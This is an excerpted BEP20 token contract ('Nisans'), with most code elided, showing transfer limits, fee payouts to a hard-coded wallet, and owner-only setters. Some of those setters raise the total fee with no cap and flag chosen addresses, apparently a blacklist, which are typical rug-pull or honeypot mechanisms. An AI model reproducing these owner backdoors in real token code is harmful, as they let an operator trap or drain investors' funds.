...
contract Nisans is IBEP20, Auth {
    ...
    string constant _name = "NinsRyans";
    string constant _symbol = "Nisans";
    ...
    address private marketingFeeReceiver = 0xb9b71380ca9566488333551a2Ad46Dd5151940CF;
    address private buybackFeeReceiver = 0xb9b71380ca9566488333551a2Ad46Dd5151940CF;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Nisans seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Nisans seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Nisans Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Nisans TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Nisans receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Nisans receiver rejected ETH transfer");
    ...
    function setDLNisans(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDENisans(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Nisans Can't let you take all native token");
    ...
    function SetliquidityFee(uint256 v) public onlyOwner {
        liquidityFee = v;
    }
